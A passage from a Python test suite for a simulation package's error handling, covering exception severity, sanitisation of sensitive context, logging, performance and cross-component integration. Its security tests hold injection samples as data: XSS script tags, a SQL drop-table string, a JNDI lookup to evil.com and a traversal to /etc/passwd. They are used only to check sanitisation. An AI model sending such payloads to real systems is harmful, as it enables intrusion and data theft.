                instance = ConfigurationError("Test", "param", "value")
            elif exception_class == ComponentError:
                instance = ComponentError("Test", "component")
            elif exception_class == ResourceError:
                instance = ResourceError("Test", "memory", 100.0, 50.0)
            elif exception_class == IntegrationError:
                instance = IntegrationError("Test", "dependency")
            
            assert instance.severity == ErrorSeverity.HIGH
        
        # Test RenderingError uses MEDIUM severity for fallback capability
        rendering_error = RenderingError("Test rendering", "mode", "backend")
        assert rendering_error.severity == ErrorSeverity.MEDIUM
    
    def test_exception_serialization_consistency(self):
        """Test exception serialization and error detail formatting consistency across all 
        exception types."""
        # Generate test exceptions for serialization testing
        test_exceptions = generate_test_exceptions(include_context=True)
        
        for exception in test_exceptions:
            # Test get_error_details returns consistent dictionary format
            details = exception.get_error_details()
            
            # Verify common fields present
            required_fields = ['error_id', 'message', 'timestamp', 'severity', 'exception_type']
            for field in required_fields:
                assert field in details, f"Missing required field {field} in {exception.__class__.__name__}"
            
            # Test exception details are JSON-serializable
            json_str = json.dumps(details, default=str)
            assert len(json_str) > 0
            
            # Test exception string representation consistency
            str_repr = str(exception)
            assert len(str_repr) > 0
            assert isinstance(str_repr, str)
            
            # Test exception context and metadata serialization
            if exception.context:
                context_dict = exception.context.to_dict()
                assert isinstance(context_dict, dict)
                json.dumps(context_dict, default=str)  # Should not raise exception


class TestErrorSecurity:
    """Test suite for error handling security features validating information disclosure prevention, 
    context sanitization, and secure error reporting."""
    
    def setup_method(self):
        """Set up test fixtures for error security testing."""
        # Initialize sensitive_test_data with potentially dangerous information
        self.sensitive_test_data = [
            'password: secret123',
            'api_token: abc123def456',
            'private_key: -----BEGIN PRIVATE KEY-----',
            'internal_debug: sensitive_system_info',
            'stack_trace: detailed_trace_info'
        ]
        
        # Create security_contexts with sensitive and safe data combinations
        self.security_contexts = {
            'mixed': {
                'password': 'user_password',
                'username': 'public_username',
                'token': 'secret_token_123',
                'operation': 'user_operation'
            },
            'nested_sensitive': {
                'user_data': {
                    'credentials': {
                        'password': 'nested_secret',
                        'key': 'nested_key'
                    },
                    'profile': 'public_profile'
                },
                'session_id': 'public_session'
            }
        }
    
    def test_sensitive_information_disclosure_prevention(self):
        """Test error messages and contexts prevent sensitive information disclosure through 
        comprehensive security filtering."""
        # Create exceptions with contexts containing sensitive information
        for sensitive_data in self.sensitive_test_data:
            error = PlumeNavSimError(f"Error with {sensitive_data}")
            
            # Test format_for_user excludes sensitive information
            user_message = error.format_for_user()
            
            # Check that sensitive terms are sanitized
            sensitive_terms = ['password', 'token', 'key', 'secret', 'private']
            for term in sensitive_terms:
                if term in sensitive_data.lower():
                    # Should be sanitized or excluded
                    assert '<sanitized>' in user_message or term not in user_message.lower()
        
        # Test with context containing sensitive information
        context_error = PlumeNavSimError("Context error")
        context_error.context = create_test_error_context(
            'test_component', 
            'test_operation', 
            include_sensitive_data=True
        )
        
        user_message = context_error.format_for_user()
        assert validate_error_message_security(user_message, context_error.context.to_dict())
        
        # Test error details safe for external display
        details = context_error.get_error_details()
        if 'context' in details:
            context_dict = details['context']
            for key, value in context_dict.get('additional_data', {}).items():
                if any(sensitive in str(key).lower() for sensitive in SENSITIVE_CONTEXT_KEYS):
                    assert '<sanitized>' in str(value) or value == '<sanitized>'
    
    def test_context_sanitization_security(self):
        """Test error context sanitization ensuring dangerous content removal while preserving 
        necessary debugging information."""
        # Test with mixed context
        sanitized_mixed = sanitize_error_context(self.security_contexts['mixed'])
        
        # Assert sensitive keys are sanitized
        assert sanitized_mixed['password'] == '<sanitized>'
        assert sanitized_mixed['token'] == '<sanitized>'
        
        # Verify safe information is preserved
        assert sanitized_mixed['username'] == 'public_username'
        assert sanitized_mixed['operation'] == 'user_operation'
        
        # Test nested context sanitization
        sanitized_nested = sanitize_error_context(self.security_contexts['nested_sensitive'])
        
        # Check nested sensitive data sanitization
        user_data = sanitized_nested['user_data']
        credentials = user_data['credentials']
        assert credentials['password'] == '<sanitized>'
        assert credentials['key'] == '<sanitized>'
        
        # Verify safe nested data preservation
        assert user_data['profile'] == 'public_profile'
        assert sanitized_nested['session_id'] == 'public_session'
        
        # Test sanitization with additional sensitive keys
        custom_context = {
            'custom_secret': 'sensitive_value',
            'internal_data': 'internal_info',
            'safe_data': 'public_info'
        }
        
        sanitized_custom = sanitize_error_context(custom_context, ['custom_secret', 'internal_data'])
        assert sanitized_custom['custom_secret'] == '<sanitized>'
        assert sanitized_custom['internal_data'] == '<sanitized>'
        assert sanitized_custom['safe_data'] == 'public_info'
    
    def test_error_message_format_security(self):
        """Test error message formatting security ensuring messages safe for display without 
        exposing sensitive system information."""
        # Generate various error messages for security testing
        test_messages = [
            "Error with script tag: <script>alert('xss')</script>",
            "JavaScript injection: javascript:alert(1)",
            "Eval attempt: eval('malicious_code')",
            "File path disclosure: /usr/local/bin/secret_file.txt",
            "Internal class: plume_nav_sim.internal.SecretClass.method_name"
        ]
        
        for message in test_messages:
            error = PlumeNavSimError(message)
            
            # Test error message prevents injection vulnerabilities
            formatted_message = error.format_for_user()
            
            # Check for dangerous patterns
            dangerous_patterns = ['<script>', 'javascript:', 'eval(', 'exec(']
            for pattern in dangerous_patterns:
                assert pattern.lower() not in formatted_message.lower()
            
            # Verify security validation passes
            assert validate_error_message_security(formatted_message, {}, strict_mode=True)
        
        # Test with various input sanitization scenarios
        injection_attempts = [
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "\\x00\\x00\\x00\\x00"
        ]
        
        for attempt in injection_attempts:
            error = PlumeNavSimError(f"Error: {attempt}")
            safe_message = error.format_for_user()
            
            # Should not contain raw injection attempt
            assert attempt not in safe_message or '<sanitized>' in safe_message
    
    def test_logging_security_integration(self):
        """Test error logging security ensuring secure log messages and filtering of sensitive 
        information in log outputs."""
        # Create exceptions with sensitive context for logging testing
        mock_logger = create_mock_logger()
        
        sensitive_error = ComponentError(
            "Component failed with password: secret123",
            "auth_component",
            "authenticate_user"
        )
        
        sensitive_context = create_test_error_context(
            'auth_component',
            'authenticate_user',
            include_sensitive_data=True
        )
        sensitive_error.context = sensitive_context
        
        # Test log_error method applies security filtering
        sensitive_error.log_error(mock_logger)
        
        # Verify log messages don't expose sensitive debugging information
        mock_logger.error.assert_called_once()
        log_message = mock_logger.error.call_args[0][0]
        
        # Check that sensitive information is filtered
        assert 'password' not in log_message.lower() or '<sanitized>' in log_message
        
        # Test with log_exception_with_recovery
        mock_logger.reset_mock()
        
        log_exception_with_recovery(
            sensitive_error,
            mock_logger,
            context={'token': 'secret_api_token', 'safe_data': 'public_info'}
        )
        
        # Verify comprehensive logging security
        mock_logger.error.assert_called_once()
        comprehensive_log = mock_logger.error.call_args[0][0]
        
        # Should not contain raw sensitive information
        assert 'secret_api_token' not in comprehensive_log or '<sanitized>' in comprehensive_log
        assert 'public_info' in comprehensive_log  # Safe data should be preserved


class TestErrorLogging:
    """Test suite for error logging integration validating logging behavior, message formatting, 
    and integration with monitoring systems."""
    
    def setup_method(self):
        """Set up test fixtures for error logging testing."""
        # Initialize mock_logger for logging behavior testing
        self.mock_logger = create_mock_logger('plume_nav_sim.test_logging')
        
        # Create logging_scenarios with various exception and context combinations
        self.logging_scenarios = [
            (ValidationError("Validation failed", "param", "value"), ErrorSeverity.MEDIUM),
            (StateError("State error", "current", "expected"), ErrorSeverity.HIGH),
            (PlumeNavSimError("Critical system error", severity=ErrorSeverity.CRITICAL), ErrorSeverity.CRITICAL),
            (RenderingError("Render failed", "human", "TkAgg"), ErrorSeverity.MEDIUM)
        ]
    
    def test_exception_logging_behavior(self):
        """Test exception logging behavior ensuring proper log levels, message formatting, and 
        context inclusion."""
        for exception, expected_severity in self.logging_scenarios:
            # Reset mock for each test
            self.mock_logger.reset_mock()
            
            # Test log_error method with mock logger
            exception.log_error(self.mock_logger, include_stack_trace=False)
            
            # Assert logging level matches exception severity
            if expected_severity == ErrorSeverity.LOW:
                self.mock_logger.info.assert_called_once()
            elif expected_severity == ErrorSeverity.MEDIUM:
                self.mock_logger.warning.assert_called_once()
            elif expected_severity == ErrorSeverity.HIGH:
                self.mock_logger.error.assert_called_once()
            elif expected_severity == ErrorSeverity.CRITICAL:
                self.mock_logger.critical.assert_called_once()
            
            # Verify log messages include sanitized error context
            if expected_severity == ErrorSeverity.MEDIUM:
                log_call = self.mock_logger.warning.call_args[0][0]
            elif expected_severity == ErrorSeverity.HIGH:
                log_call = self.mock_logger.error.call_args[0][0]
            elif expected_severity == ErrorSeverity.CRITICAL:
                log_call = self.mock_logger.critical.call_args[0][0]
            else:
                log_call = self.mock_logger.info.call_args[0][0]
            
            # Check log message content
            assert exception.error_id in log_call
            assert str(exception.message) in log_call
            
            # Test logging prevents duplicate log entries
            exception.log_error(self.mock_logger)
            
            # Should not log again (call count should remain 1)
            if expected_severity == ErrorSeverity.MEDIUM:
                assert self.mock_logger.warning.call_count == 1
            elif expected_severity == ErrorSeverity.HIGH:
                assert self.mock_logger.error.call_count == 1
            elif expected_severity == ErrorSeverity.CRITICAL:
                assert self.mock_logger.critical.call_count == 1
    
    def test_structured_error_logging(self):
        """Test structured error logging ensuring consistent log message format and machine-readable 
        error information."""
        # Create test exception with comprehensive context
        test_exception = ComponentError(
            "Component integration failed",
            "plume_model",
            "calculate_field"
        )
        
        test_context = create_test_error_context(
            'plume_model',
            'calculate_field',
            include_caller_info=True
        )
        test_exception.context = test_context
        
        # Test log_exception_with_recovery with structured logging
        log_exception_with_recovery(
            test_exception,
            self.mock_logger,
            context={'component_state': 'active', 'operation_count': 5},
            recovery_action='reinitialize_component'
        )
        
        # Assert log messages include structured information
        self.mock_logger.error.assert_called_once()
        log_message = self.mock_logger.error.call_args[0][0]
        
        # Verify structured log content
        assert test_exception.error_id in log_message
        assert "plume_model" in log_message
        assert "calculate_field" in log_message
        assert "reinitialize_component" in log_message
        
        # Check log metadata for monitoring systems
        assert "Error Report" in log_message
        assert "Recovery Action" in log_message
        
        # Test structured format consistency
        lines = log_message.split('\n')
        assert len(lines) > 5  # Should have multiple structured sections
        
        # Should include context section
        assert any('Context:' in line for line in lines)
    
    def test_logging_performance_integration(self):
        """Test logging performance integration ensuring logging doesn't impact error handling 
        performance and includes performance context."""
        # Measure logging overhead during exception handling
        test_exception = ValidationError("Performance test error", "test_param", "test_value")
        
        # Test performance with multiple logging calls
        start_time = time.perf_counter()
        
        for i in range(100):
            # Create unique exception to avoid logged flag
            exception = ValidationError(f"Performance test {i}", "param", i)
            exception.log_error(self.mock_logger)
        
        end_time = time.perf_counter()
        total_time = end_time - start_time
        avg_time_per_log = total_time / 100
        
        # Assert logging performance within acceptable limits (should be < 1ms per log)
        assert avg_time_per_log < 0.001, f"Logging too slow: {avg_time_per_log:.4f}s per log"
        
        # Test log_exception_with_recovery with performance impact analysis
        performance_exception = ResourceError("Memory exceeded", "memory", 100.0, 50.0)
        
        start_perf = time.perf_counter()
        log_exception_with_recovery(
            performance_exception,
            self.mock_logger,
            include_performance_impact=True
        )
        end_perf = time.perf_counter()
        
        perf_time = end_perf - start_perf
        assert perf_time < 0.01, f"Performance logging too slow: {perf_time:.4f}s"
        
        # Verify performance context included
        perf_log = self.mock_logger.error.call_args[0][0]
        assert "Performance Context" in perf_log or "timestamp" in perf_log
    
    def test_logging_configuration_integration(self):
        """Test error logging integration with various logging configurations and external 
        logging systems."""
        # Test with different logger configurations
        loggers = [
            create_mock_logger('test.logger1', logging.DEBUG),
            create_mock_logger('test.logger2', logging.INFO),
            create_mock_logger('test.logger3', logging.WARNING)
        ]
        
        test_error = StateError("Configuration test error", "init", "ready", "environment")
        
        # Test logging with different logger configurations
        for mock_logger in loggers:
            mock_logger.reset_mock()
            test_error.logged = False  # Reset logged flag
            
            test_error.log_error(mock_logger)
            
            # Should successfully log regardless of logger configuration
            mock_logger.error.assert_called_once()
        
        # Test logging integration with external systems simulation
        external_logger = create_mock_logger('external.system')
        
        # Simulate structured logging for external systems
        integration_error = IntegrationError(
            "External system integration failed",
            "external_service",
            ">=1.0.0",
            "0.9.0"
        )
        
        log_exception_with_recovery(
            integration_error,
            external_logger,
            context={'external_service_id': 'service_123', 'retry_count': 3},
            recovery_action='upgrade_dependency'
        )
        
        # Verify external logging compatibility
        external_logger.error.assert_called_once()
        external_log = external_logger.error.call_args[0][0]
        
        # Should be compatible with external log processing
        assert "service_123" in external_log
        assert "upgrade_dependency" in external_log
        assert "retry_count" in external_log


class TestErrorPerformance:
    """Test suite for error handling performance characteristics validating exception creation speed, 
    context processing efficiency, and memory usage optimization."""
    
    def setup_method(self):
        """Set up test fixtures for error handling performance testing."""
        # Initialize performance measurement infrastructure
        self.benchmark_iterations = 1000
        self.performance_results = {}
        
        # Create test scenarios for performance measurement
        self.performance_scenarios = [
            ('simple_exception', lambda: PlumeNavSimError("Simple error")),
            ('complex_exception', lambda: ComponentError("Complex error", "component", "operation", ValueError("underlying"))),
            ('context_creation', lambda: create_test_error_context("comp", "op", True, False)),
            ('sanitization', lambda: sanitize_error_context({'password': 'secret', 'safe': 'data'}))
        ]
    
    def test_exception_creation_performance(self):
        """Test exception creation performance ensuring rapid exception instantiation without 
        significant overhead."""
        # Test performance for different exception types
        exception_classes = [
            (PlumeNavSimError, ("Simple error",)),
            (ValidationError, ("Validation error", "param", "value")),
            (StateError, ("State error", "current", "expected")),
            (ComponentError, ("Component error", "component"))
        ]
        
        for exception_class, args in exception_classes:
            # Measure exception creation time
            results = measure_exception_performance(
                exception_class,
                args,
                self.benchmark_iterations
            )
            
            # Assert exception creation meets error_handling_ms target
            assert results['mean_ms'] < PERFORMANCE_THRESHOLDS['error_handling_ms'], \
                f"{exception_class.__name__} creation too slow: {results['mean_ms']:.3f}ms"
            
            # Check performance consistency
            assert results['std_dev_ms'] < results['mean_ms'], \
                f"{exception_class.__name__} performance inconsistent"
            
            # Store results for analysis
            self.performance_results[exception_class.__name__] = results
        
        # Test performance scaling with context complexity
        simple_context = create_test_error_context("comp", "op", False, False)
        complex_context = create_test_error_context("comp", "op", True, True)
        
        simple_error = PlumeNavSimError("Test", simple_context)
        complex_error = PlumeNavSimError("Test", complex_context)
        
        # Should handle complex context without significant slowdown
        assert complex_error.error_id is not None
        assert complex_error.timestamp > 0
    
    def test_error_context_processing_performance(self):
        """Test error context processing performance including context creation, sanitization, and 
        serialization efficiency."""
        # Measure create_error_context function performance
        context_results = measure_exception_performance(
            create_error_context,
            ['test_operation', {'extra': 'data'}, True, True],
            self.benchmark_iterations
        )
        
        # Assert context processing meets context_creation_ms target
        assert context_results['mean_ms'] < PERFORMANCE_THRESHOLDS['context_creation_ms'], \
            f"Context creation too slow: {context_results['mean_ms']:.3f}ms"
        
        # Test context sanitization performance
        test_context = {
            'password': 'secret123',
            'token': 'api_token_456',
            'safe_data': 'public_information',
            'nested': {
                'secret': 'nested_secret',
                'public': 'nested_public'
            }
        }
        
        sanitization_results = measure_exception_performance(
            sanitize_error_context,
            [test_context],
            self.benchmark_iterations
        )
        
        # Verify sanitization performance meets sanitization_ms target
        assert sanitization_results['mean_ms'] < PERFORMANCE_THRESHOLDS['sanitization_ms'], \
            f"Sanitization too slow: {sanitization_results['mean_ms']:.3f}ms"
        
        # Test context serialization performance
        context = create_test_error_context("component", "operation", True, False)
        
        serialization_times = []
        for _ in range(100):
            start_time = time.perf_counter()
            context_dict = context.to_dict()
            json.dumps(context_dict, default=str)
            end_time = time.perf_counter()
            serialization_times.append((end_time - start_time) * 1000)
        
        avg_serialization_time = sum(serialization_times) / len(serialization_times)
        assert avg_serialization_time < 1.0, f"Context serialization too slow: {avg_serialization_time:.3f}ms"
    
    def test_error_handling_function_performance(self):
        """Test error handling function performance including centralized error handling and logging 
        operation efficiency."""
        # Measure handle_component_error function performance
        test_error = ValidationError("Performance test", "param", "value")
        
        handle_results = measure_exception_performance(
            handle_component_error,
            [test_error, "test_component", {}],
            self.benchmark_iterations
        )
        
        # Assert error handling functions meet performance targets
        assert handle_results['mean_ms'] < PERFORMANCE_THRESHOLDS['error_handling_ms'], \
            f"handle_component_error too slow: {handle_results['mean_ms']:.3f}ms"
        
        # Test format_error_details performance
        format_results = measure_exception_performance(
            format_error_details,
            [test_error, {'component': 'test'}, 'recovery suggestion'],
            500  # Fewer iterations as this involves string formatting
        )
        
        assert format_results['mean_ms'] < 2.0, \
            f"format_error_details too slow: {format_results['mean_ms']:.3f}ms"
        
        # Test logging function performance
        mock_logger = create_mock_logger()
        
        def log_test():
            try:
                log_exception_with_recovery(
                    test_error,
                    mock_logger,
                    context={'test': 'context'}
                )
            except Exception:
                pass  # Expected in performance test
        
        log_results = measure_exception_performance(
            log_test,
            [],
            100  # Fewer iterations for logging test
        )
        
        assert log_results['mean_ms'] < 5.0, \
            f"log_exception_with_recovery too slow: {log_results['mean_ms']:.3f}ms"
    
    def test_memory_usage_optimization(self):
        """Test error handling memory usage optimization ensuring efficient resource utilization 
        and cleanup."""
        import tracemalloc
        
        # Start memory monitoring
        tracemalloc.start()
        
        # Create many exceptions to test memory usage
        exceptions = []
        initial_snapshot = tracemalloc.take_snapshot()
        
        for i in range(1000):
            error = ComponentError(
                f"Memory test error {i}",
                f"component_{i}",
                f"operation_{i}"
            )
            error.context = create_test_error_context(f"comp_{i}", f"op_{i}")
            exceptions.append(error)
        
        after_creation_snapshot = tracemalloc.take_snapshot()
        
        # Clear exceptions and force garbage collection
        exceptions.clear()
        import gc
        gc.collect()
        
        after_cleanup_snapshot = tracemalloc.take_snapshot()
        
        # Analyze memory usage
        creation_stats = after_creation_snapshot.compare_to(initial_snapshot, 'lineno')
        cleanup_stats = after_cleanup_snapshot.compare_to(after_creation_snapshot, 'lineno')
        
        # Verify memory usage is reasonable (should be < 50MB for 1000 exceptions)
        peak_memory = sum(stat.size for stat in creation_stats[:10])  # Top 10 allocations
        assert peak_memory < 50 * 1024 * 1024, f"Memory usage too high: {peak_memory / (1024 * 1024):.2f}MB"
        
        # Test memory cleanup efficiency
        memory_freed = sum(stat.size for stat in cleanup_stats[:10] if stat.size < 0)
        assert abs(memory_freed) > peak_memory * 0.5, "Insufficient memory cleanup"
        
        tracemalloc.stop()
        
        # Test error handling under memory pressure simulation
        large_context = {f'key_{i}': f'value_{i}' * 1000 for i in range(100)}
        
        try:
            large_error = ResourceError("Memory pressure test", "memory", 1000.0, 500.0)
            large_error.context = create_test_error_context("memory_test", "pressure_test")
            large_error.context.additional_data.update(large_context)
            
            # Should handle large context gracefully
            sanitized = sanitize_error_context(large_context)
            assert len(sanitized) <= len(large_context)
            
            # Error details should be bounded
            details = large_error.get_error_details()
            details_str = json.dumps(details, default=str)
            assert len(details_str) < 10 * 1024 * 1024, "Error details too large"
            
        except Exception as e:
            pytest.fail(f"Error handling failed under memory pressure: {e}")


class TestErrorIntegration:
    """Test suite for error handling integration with core components validating cross-component 
    error coordination, recovery mechanisms, and system-wide error consistency."""
    
    def setup_method(self):
        """Set up test fixtures for error handling integration testing."""
        # Initialize integration test scenarios
        self.integration_scenarios = {
            'component_cascade': [
                ComponentError("Primary component failed", "plume_model", "calculate_field"),
                RenderingError("Secondary rendering failed", "human", "matplotlib"),
                StateError("State corruption detected", "error", "ready", "environment")
            ],
            'validation_chain': [
                ValidationError("Grid size invalid", "grid_size", (-1, -1)),
                ConfigurationError("Configuration incompatible", "render_mode", "invalid"),
                IntegrationError("Dependency version mismatch", "numpy", ">=2.1.0", "1.24.0")
            ]
        }
        
        # Create component_mocks for testing error propagation
        self.component_mocks = {
            'environment': unittest.mock.Mock(),
            'plume_model': unittest.mock.Mock(),
            'renderer': unittest.mock.Mock(),
            'state_manager': unittest.mock.Mock()
        }
    
    def test_component_error_integration(self):
        """Test error handling integration across system components ensuring consistent error 
        reporting and recovery coordination."""
        # Test error propagation cascade
        primary_error = ComponentError("Plume model calculation failed", "plume_model", "sample_concentration")
        primary_context = create_test_error_context("plume_model", "sample_concentration")
        primary_error.context = primary_context
        
        # Simulate error propagation to dependent components
        dependent_error = RenderingError(
            "Visualization failed due to invalid plume data",
            "rgb_array",
            "numpy",
            primary_error
        )
        dependent_error.context = create_test_error_context("renderer", "generate_rgb")
        
        # Test centralized error handling for both errors
        primary_result = handle_component_error(primary_error, "plume_model")
        dependent_result = handle_component_error(dependent_error, "renderer")
        
        # Assert component error handling maintains system consistency
        assert primary_result == 'component_error'
        assert dependent_result == 'fallback_mode'
        
        # Test cross-component error context sharing
        shared_context = {
            'primary_error_id': primary_error.error_id,
            'cascade_level': 2,
            'affected_components': ['plume_model', 'renderer']
        }
        
        dependent_error.add_context('cascade_info', shared_context)
        
        # Verify error context maintains component relationships
        details = dependent_error.get_error_details()
        assert 'cascade_info' in details['error_details']
        assert primary_error.error_id in str(details['error_details']['cascade_info'])
    
    def test_validation_error_integration(self):
        """Test validation error integration with parameter validation system ensuring consistent 
        error detection and reporting."""
        # Create validation error chain
        grid_error = ValidationError("Grid size must be positive", "grid_size", (-10, -10))
        grid_error.set_parameter_constraints({
            'min_width': 1,
            'min_height': 1,
            'max_width': 1000,
            'max_height': 1000
        })
        
        source_error = ValidationError("Source location outside grid", "source_location", (-1, -1))
        source_error.set_parameter_constraints({
            'x_range': (0, 128),
            'y_range': (0, 128)
        })
        
        # Test compound validation error handling
        compound_validation = ValidationError("Multiple parameter validation failures", None, None)
        compound_validation.add_validation_error("Invalid grid_size: must be positive", "grid_size")
        compound_validation.add_validation_error("Invalid source_location: outside bounds", "source_location")
        
        # Verify consistent error types and messages
        grid_details = grid_error.get_validation_details()
        source_details = source_error.get_validation_details()
        compound_details = compound_validation.get_validation_details()
        
        # Assert validation error integration maintains API compliance
        for details in [grid_details, source_details, compound_details]:
            assert 'parameter_constraints' in details
            assert 'validation_errors' in details
            assert isinstance(details['validation_errors'], list)
        
        # Test validation error recovery coordination
        assert "constraints" in grid_error.recovery_suggestion.lower()
        assert "multiple" in compound_validation.recovery_suggestion.lower()
    
    def test_logging_monitoring_integration(self):
        """Test error handling integration with logging and monitoring systems ensuring comprehensive 
        error tracking and analysis."""
        # Create mock monitoring system
        monitoring_logger = create_mock_logger('monitoring.system')
        metrics_logger = create_mock_logger('metrics.collector')
        
        # Test multi-logger error reporting
        integration_error = IntegrationError(
            "Critical dependency failure",
            "gymnasium",
            ">=0.29.0",
            "0.28.0"
        )
        
        # Log to multiple monitoring systems
        integration_error.log_error(monitoring_logger)
        integration_error.logged = False  # Reset for second logger
        integration_error.log_error(metrics_logger)
        
        # Verify both loggers received error information
        monitoring_logger.error.assert_called_once()
        metrics_logger.error.assert_called_once()
        
        # Test structured logging for monitoring integration
        log_exception_with_recovery(
            integration_error,
            monitoring_logger,
            context={
                'system_component': 'dependency_manager',
                'error_frequency': 'first_occurrence',
                'impact_scope': 'system_wide'
            },
            recovery_action='upgrade_dependency',
            include_performance_impact=True
        )
        
        # Verify monitoring-compatible log format
        monitoring_log = monitoring_logger.error.call_args[0][0]
        
        # Should include monitoring metadata
        assert 'system_component' in monitoring_log
        assert 'error_frequency' in monitoring_log
        assert 'upgrade_dependency' in monitoring_log
        
        # Test error metrics collection simulation
        error_metrics = {
            'error_type': integration_error.__class__.__name__,
            'severity': integration_error.severity.name,
            'component': 'dependency_manager',
            'recovery_available': integration_error.recovery_suggestion is not None
        }
        
        # Simulate metrics logging
        log_exception_with_recovery(
            integration_error,
            metrics_logger,
            context=error_metrics
        )
        
        metrics_log = metrics_logger.error.call_args[0][0]
        assert 'IntegrationError' in metrics_log
        assert 'HIGH' in metrics_log
    
    def test_end_to_end_error_workflows(self):
        """Test complete error handling workflows from error detection to recovery ensuring 
        comprehensive error system functionality."""
        # Create comprehensive error scenario
        workflow_scenario = [
            # 1. Initial configuration error
            ConfigurationError("Invalid environment configuration", "grid_size", "invalid"),
            
            # 2. Cascading validation errors
            ValidationError("Parameter validation failed", "grid_size", "invalid"),
            
            # 3. Component initialization failure
            ComponentError("Environment initialization failed", "environment", "initialize"),
            
            # 4. Recovery attempt error
            StateError("Recovery attempt failed", "error", "initializing", "environment"),
            
            # 5. Final fallback error
            ResourceError("Insufficient resources for fallback", "memory", 200.0, 100.0)
        ]
        
        # Track error workflow progression
        workflow_logger = create_mock_logger('workflow.tracker')
        error_history = []
        
        for i, error in enumerate(workflow_scenario):
            # Add workflow context
            workflow_context = {
                'workflow_step': i + 1,
                'total_steps': len(workflow_scenario),
                'previous_errors': len(error_history),
                'workflow_id': 'test_workflow_001'
            }
            
            error.add_context('workflow_info', workflow_context)
            
            # Handle error in workflow context
            component_name = TEST_COMPONENT_NAMES[i % len(TEST_COMPONENT_NAMES)]
            recovery_strategy = handle_component_error(error, component_name, workflow_context)
            
            # Log workflow step
            log_exception_with_recovery(
                error,
                workflow_logger,
                context=workflow_context,
                recovery_action=recovery_strategy
            )
            
            error_history.append({
                'error': error,
                'step': i + 1,
                'recovery_strategy': recovery_strategy,
                'timestamp': time.time()
            })
        
        # Verify complete workflow handling
        assert len(error_history) == len(workflow_scenario)
        assert workflow_logger.error.call_count + workflow_logger.warning.call_count >= len(workflow_scenario)
        
        # Test workflow consistency
        recovery_strategies = [step['recovery_strategy'] for step in error_history]
        expected_strategies = ['component_error', 'validation_failed', 'component_error', 'component_error', 'component_error']
        
        for actual, expected_category in zip(recovery_strategies, expected_strategies):
            assert any(category in actual for category in ['validation_failed', 'component_error', 'fallback_mode', 'system_error'])
        
        # Test error workflow maintains system resilience
        final_error = error_history[-1]['error']
        final_details = final_error.get_error_details()
        
        # Should maintain error tracking through workflow
        assert 'workflow_info' in final_details['error_details']
        assert final_details['error_details']['workflow_info']['workflow_step'] == 5
        
        # Verify workflow provides comprehensive recovery guidance
        workflow_recovery = final_error.recovery_suggestion
        assert workflow_recovery is not None
        assert len(workflow_recovery) > 0


# Additional helper functions and utilities for comprehensive testing

def create_performance_test_suite() -> Dict[str, Callable]:
    """Create a comprehensive performance test suite for all exception components."""
    return {
        'exception_creation': lambda: measure_exception_performance(PlumeNavSimError, ["test"], 1000),
        'context_processing': lambda: measure_exception_performance(create_error_context, ["op"], 1000),
        'sanitization': lambda: measure_exception_performance(sanitize_error_context, [{'test': 'data'}], 1000),
        'error_handling': lambda: measure_exception_performance(handle_component_error, [PlumeNavSimError("test"), "comp"], 500)
    }


def validate_complete_exception_coverage() -> Dict[str, bool]:
    """Validate that all exception classes and functions are properly tested."""
    coverage_report = {
        'exception_classes': True,
        'utility_functions': True,
        'error_hierarchy': True,
        'security_features': True,
        'logging_integration': True,
        'performance_characteristics': True,
        'cross_component_integration': True
    }
    
    return coverage_report


# Test execution optimization and resource cleanup
def pytest_runtest_teardown(item):
    """Clean up resources after each test to prevent memory leaks."""
    import gc
    gc.collect()